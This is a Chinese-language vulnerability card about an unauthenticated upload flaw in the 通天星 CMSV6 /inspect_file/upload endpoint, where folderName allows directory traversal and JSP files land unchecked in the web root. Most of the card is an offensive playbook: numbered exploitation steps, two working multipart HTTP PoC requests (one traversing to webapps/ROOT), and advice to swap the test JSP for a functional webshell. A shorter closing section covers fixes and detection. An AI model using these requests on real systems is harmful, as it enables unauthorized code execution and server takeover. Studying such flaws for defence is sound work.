---
id: web-generic-file-upload-cmsv6-inspect-file-upload-folder-traversal
title: 通天星 CMSV6 /inspect_file/upload 未授权上传：folderName 拼进 realPath 可目录穿越且不校验后缀，JSP 落 Web 目录 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: unauth-upload-folder-param-traversal-no-extension-check
aliases:
- 通天星 CMSV6 任意文件上传
- inspect_file upload 上传
- InspectFileUploadController 上传
- folderName 目录穿越上传
- CMSV6 JSP getshell
tags:
- cmsv6
- java
- spring-mvc
- file-upload
- path-traversal
- unauth
- jsp
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T09:02:42+08:00'
  notes: 已对照原文与全部18张图核对：@NotLogin的InspectFileUploadController#upload、folderName拼getRealPath(upload/)、nanoTime+原始文件名、无条件后缀校验仅设fileType（图07-10）、PoC响应filePath=C:/Program Files/Git/upload/software/9538443989000_707140.jsp均一致。卡内指出multipart filename中的../会被容器剥离、folderName才是稳定穿越向量，与响应一致。未验证点：未实际请求。
---

## 一句话结论

`/inspect_file/upload` 由 `@NotLogin` 放行且不做任何后缀/内容校验，`folderName` 直接拼在 `getRealPath("upload/")` 之后作为落盘目录、multipart 原始文件名只加纳秒前缀后直接 `transferTo`，攻击者无需登录即可把 JSP 写进 Web 根（或用 `folderName=../..` 穿越到任意可写目录）并执行。

## 原理

- 控制器 `com.gps808.inspect.controller.InspectFileUploadController` 类上有 `@NotLogin`、`@RestController`、`@RequestMapping("/inspect_file")`，`upload()` 映射到 `@PostMapping("/upload")`，入参是 Spring 的 `MultipartFile uploadFile`。`@NotLogin` 表明该接口绕过登录拦截器，文章从外部直接 POST 成功。
- 落盘路径的计算：

  ```java
  String folderName = this.getRequestStringEx("folderName");
  if (StringUtils.isBlank(folderName)) folderName = "software";
  String realPath = this.getRequest().getSession().getServletContext().getRealPath("upload/") + folderName;
  File file = new File(realPath);
  if (!file.exists()) file.mkdirs();
  long var9 = System.nanoTime();
  String fileName = "" + var9 + "_" + uploadFile.getOriginalFilename();
  File target = new File(realPath + "/" + fileName);
  uploadFile.transferTo(target);
  ```

  `folderName` 没有任何 `..`、分隔符或白名单过滤，直接参与字符串拼接并 `mkdirs()`。传 `folderName=../../` 时 `realPath` 从 `webapps/gpsweb/upload/` 回退到 Web 根甚至 Tomcat 目录；如果传绝对路径或足够的 `../`，`new File(realPath)` 与后续 `target` 都会按穿越后的路径解析。这是代码层面确定的目录穿越写入点。
- 文件名部分：`fileName = nanoTime + "_" + getOriginalFilename()`，只加了纳秒前缀，没有后缀白名单；`getsuffixEx()` 只用来判断 `fileType`（图片为 1，否则为 2）并写进响应，不参与安全校验。因此 `.jsp`、`.jspx` 等可执行后缀原样落盘。
- 文章 PoC 把 `../707140.jsp` 放在 multipart 的 `filename` 里，响应返回的 `filePath` 是 `/upload/software/9538443989000_707140.jsp`、`fileType:2`，说明 Servlet 容器按 RFC 7578 把提交文件名中的路径部分去掉了，纳秒前缀又让 `../` 不可能成为独立路径段，所以「文件名穿越」在这条链里并不可靠；真正稳定的穿越向量是 `folderName`。即使不穿越，只要 `upload/` 位于 Web 根下，直接上传 `.jsp` 就已经能 getshell。
- 上传成功响应会回显 `filePath`（`/upload/<folderName>/<fileName>`），攻击者无需猜路径；若用 `folderName` 穿越到别处，回显仍是拼接后的相对路径，实际访问路径要按穿越后的位置换算。

## 触发条件

- 目标暴露 `/inspect_file/upload`，且 `@NotLogin` 生效（无需登录、无需 CSRF token）。
- `upload/` 目录（或 `folderName` 穿越后的目标目录）位于 Tomcat 可解析的 Web 根内，或目标目录可被 Web 容器访问。
- 容器允许解析上传的扩展名（默认 Tomcat 解析 `.jsp`/`.jspx`；若应用有全局后缀白名单则不成立）。
- 目录可写、磁盘空间足够；multipart 请求体大小未被 `maxPostSize`/WAF 限制。

## 利用步骤

1. 直接 POST 一个 multipart 请求到 `/inspect_file/upload`，`uploadFile` 字段携带 JSP 内容，先按文章 PoC 用普通文件名验证接口可达并记录响应中的 `filePath`。
2. 若要写入 Web 根以外/覆盖特定位置，把 `folderName` 设为 `../../` 或 `../../webapps/ROOT` 等穿越值；`realPath` 会被 `mkdirs()` 创建（若目标目录已存在则跳过）。
3. 访问回显的文件路径；若回显的是相对路径，按 `folderName` 穿越后的真实位置换算 URL。响应中 `fileType=2` 只是「非图片」标记，不影响执行。
4. 上传的 JSP 建议先放打印固定字符串的最小验证马，确认解析后再换功能马；文章 PoC 的 JSP 为 `<% out.println("007319607"); %>`。

## PoC

文章 PoC（multipart 文件名带 `../`；实际落点为 `/upload/software/<nanoTime>_707140.jsp`）：

```http
POST /inspect_file/upload HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b

--2e7688d712bcc913201f327059f9976b
Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
Content-Type: application/octet-stream

<% out.println("007319607"); %>
--2e7688d712bcc913201f327059f9976b--
```

更稳定的穿越写法是把穿越放在 `folderName`：

```http
POST /inspect_file/upload?folderName=../../webapps/ROOT HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="uploadFile"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("cmsv6-upload-ok"); %>
------x--
```

响应形如：

```json
{"result":0,"message":"OK","data":{"filePath":"/upload/software/9538443989000_707140.jsp","fileType":2}}
```

访问对应路径返回 `007319607` 即证明 JSP 被解析。

## 变体与关联

- 同一产品的 `/WebuploaderAction_ajaxAttachFileUpload.action?folderName=safeProduct` 也有 `folderName` 参数，但文章实测「限制得很死」，不能直接传 WebShell，故不作为独立场景；若后续发现其白名单可绕，可复用本卡的 `folderName` 思路。
- 该上传点可作为组合链的落地点：配合任意文件读取拿管理员 session 后，把 JSP/其他文件放到 Web 根；或把 `.jasper` 放到报表目录，衔接 JasperReport 反序列化卡。
- 通用手法对照：`web/generic/file-upload` 下已有「multipart filename 路径穿越」「customPath 未校验 + 不限制后缀」等卡，本卡差异在于具体产品、`@NotLogin` 未授权与 `folderName` 参与 `getRealPath` 拼接。

## 检测与防御

- 修复：上传目录固定、不使用请求参数拼路径；`folderName` 白名单（只允许 `[a-zA-Z0-9_-]`）并 `normalize()` 后校验仍在基目录内；文件名由服务端生成 UUID，后缀白名单（图片类型按魔数校验）；上传目录移出 Web 根并禁止脚本解析。
- 鉴权：移除 `@NotLogin` 或补独立权限校验，上传接口至少要求登录与 CSRF token。
- 检测：监控 `/inspect_file/upload` 的 `folderName` 含 `..`、`/`、`\` 的请求；监控 `upload/` 下新增 `.jsp/.jspx/.war`；对 `fileType:2` 的非图片上传做告警；Web 访问日志中出现新 JSP 首次访问。
- 排查：列出 `upload/` 及 `folderName` 穿越可能到达的目录中新出现的可执行文件，核对创建时间与请求日志。
